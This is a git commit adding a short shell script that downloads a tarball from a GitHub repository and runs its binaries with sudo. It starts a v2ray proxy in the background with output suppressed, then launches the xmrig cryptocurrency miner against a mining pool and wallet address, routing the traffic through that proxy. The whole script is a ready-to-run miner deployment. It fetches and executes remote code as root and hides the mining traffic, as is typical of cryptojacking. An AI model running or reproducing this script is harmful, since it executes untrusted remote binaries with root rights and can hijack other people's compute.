6b7fa74235cc5af6abffff9ae76e08bb2e20bdd7
prendibs <94189491+prendibs@users.noreply.github.com>
2025-08-10 11:41:56 +0700

    Add files via upload

---
+++ ap.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+#love u fika
+
+wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
+nohup sudo ./v2ray run --config=eu.json </dev/null >/dev/null 2>&1 &
+echo "love u fika"
+sudo ./xmrig -B -x 127.0.0.1:443 -o eu.0xpool.io:3333 -u 0x5e07fa9eb92d6e16894641c714e1412b64e1c007 -p ap -a rx/0 -k --randomx-1gb-pages
